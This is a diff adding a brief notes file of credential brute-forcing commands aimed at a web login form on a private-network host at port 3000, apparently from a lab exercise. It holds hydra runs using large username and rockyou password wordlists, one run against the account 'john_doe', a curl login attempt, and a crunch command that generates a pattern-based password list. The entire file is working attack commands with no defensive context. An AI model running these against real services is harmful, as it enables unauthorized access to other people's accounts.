@@ -1,0 +1,12 @@
+hydra -L xato-net-10-million-usernames.txt -P rockyou.txt 172.24.240.1 -s 3000 http-post-form "/login:username=^USER^&password=^PASS^:S=302" -I -f -vV
+
+
+xato-net-10-million-usernames.txt
+rockyou.txt
+
+curl -X POST http://172.24.240.1:3000/login -d "username=john_doe&password=password123"
+
+
+hydra -l john_doe -P rockyou.txt 172.24.240.1 -s 3000 http-post-form "/login:username=^USER^&password=^PASS^:S=302" -I -f
+
+crunch 11 11 -t passw@@@%%% -o johndoe.txt
